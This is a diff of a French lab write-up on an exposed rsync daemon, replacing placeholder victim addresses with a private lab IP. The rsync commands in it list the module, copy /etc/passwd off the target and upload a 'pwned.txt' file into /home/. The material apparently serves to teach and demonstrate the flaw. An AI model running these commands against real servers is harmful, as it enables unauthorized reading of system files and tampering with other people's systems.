@@ -32,14 +32,14 @@ Mécanisme et Impact : Dans notre cas, le démon est configuré avec un module a
 Sur la machine attaquante : 
 ```
 # Preuve d'accès
-rsync rsync://<IP-VICTIME>:873/src/
+rsync rsync://192.168.125.128:873/src/
 
 # Preuve de lecture
-rsync -av rsync://<IP-VICTIME:873/src/etc/passwd ./
+rsync -av rsync://192.168.125.128:873/src/etc/passwd ./
 
 # Preuve d'écriture
 touch pwned.txt
-rsync pwned.txt rsync://<IP_VICTIME>:873/src/home/
+rsync pwned.txt rsync://192.168.125.128:873/src/home/
 ```
 
 ## Explication de la raison pour laquelle l’exploit fonctionne
